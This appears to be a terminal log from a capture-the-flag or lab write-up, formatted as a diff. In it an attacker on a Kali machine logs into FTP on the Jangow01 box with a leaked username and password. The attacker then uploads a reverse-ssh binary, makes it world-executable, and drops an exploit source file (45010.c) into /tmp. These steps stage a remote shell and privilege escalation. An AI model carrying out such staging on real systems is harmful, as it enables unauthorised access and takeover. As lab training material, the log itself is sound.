@@ -1,0 +1,28 @@
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.0.0.221
+Connected to 10.0.0.221.
+220 (vsFTPd 3.0.3)
+Name (10.0.0.221:kali): jangow01
+Password: abygurl69
+230 Login successful.
+
+ftp> cd /home/jangow01
+250 Directory successfully changed.
+
+ftp> put reverse-sshx64 reverse-sshx64
+229 Entering Extended Passive Mode (|||9740|)
+150 Ok to send data.
+226 Transfer complete.
+4739234 bytes sent in 00:00 (249.22 MiB/s)
+
+ftp> chmod 777 reverse-sshx64
+200 SITE CHMOD command ok.
+
+ftp> cd /tmp
+250 Directory successfully changed.
+
+ftp> put 45010.c 45010.c
+229 Entering Extended Passive Mode (|||62173|)
+150 Ok to send data.
+226 Transfer complete.
+13176 bytes sent in 00:00 (33.15 MiB/s)
